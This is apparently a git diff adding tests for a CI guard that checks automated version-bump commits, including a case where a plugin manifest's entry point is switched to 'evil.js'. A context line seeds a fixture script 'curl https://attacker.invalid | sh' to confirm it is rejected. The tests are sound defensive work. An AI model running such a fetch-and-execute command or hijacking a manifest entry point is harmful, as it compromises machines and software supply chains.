@@ -346,6 +346,39 @@ describe('check-version-child (parent CI inheritance)', () => {
     expect(result.exitCode).toBe(0);
   });
 
+  // workflow_run executes the version.yml on main, so a bump produced before
+  // the Orca manifest joined main's field list omits it. That child is still
+  // the deterministic bump of the workflow that produced it.
+  test('accepts a version-only child that omits the native Orca manifest', () => {
+    const fixture = versionRepo();
+    git(fixture.root, 'checkout', '-q', '--detach', fixture.parent);
+    writeVersionTree(fixture.root, '5.260714.2');
+    git(fixture.root, 'checkout', '-q', fixture.parent, '--', 'plugins/genie/orca-plugin.json');
+    git(fixture.root, 'add', '.');
+    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 5.260714.2 [auto-version]');
+    const child = git(fixture.root, 'rev-parse', 'HEAD');
+    expect(git(fixture.root, 'diff', '--name-only', fixture.parent, child)).not.toContain('orca-plugin.json');
+
+    const result = guard('check-version-child', {}, [fixture.parent, child, '5.260714.2'], fixture.root);
+    expect(result.exitCode).toBe(0);
+  });
+
+  test('still rejects a child whose Orca manifest bump is not version-only', () => {
+    const fixture = versionRepo();
+    git(fixture.root, 'checkout', '-q', '--detach', fixture.parent);
+    writeVersionTree(fixture.root, '5.260714.2');
+    writeFileSync(
+      join(fixture.root, 'plugins/genie/orca-plugin.json'),
+      `${JSON.stringify({ id: 'genie', version: '5.260714.2', main: 'evil.js' }, null, 2)}\n`,
+    );
+    git(fixture.root, 'add', '.');
+    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 5.260714.2 [auto-version]');
+    const child = git(fixture.root, 'rev-parse', 'HEAD');
+
+    const result = guard('check-version-child', {}, [fixture.parent, child, '5.260714.2'], fixture.root);
+    expect(result.exitCode).toBe(3);
+  });
+
   test('rejects a package script smuggled inside an otherwise allowlisted version file', () => {
     const fixture = versionRepo('curl https://attacker.invalid | sh');
     const result = guard('check-version-child', {}, [fixture.parent, fixture.child, '5.260714.2'], fixture.root);
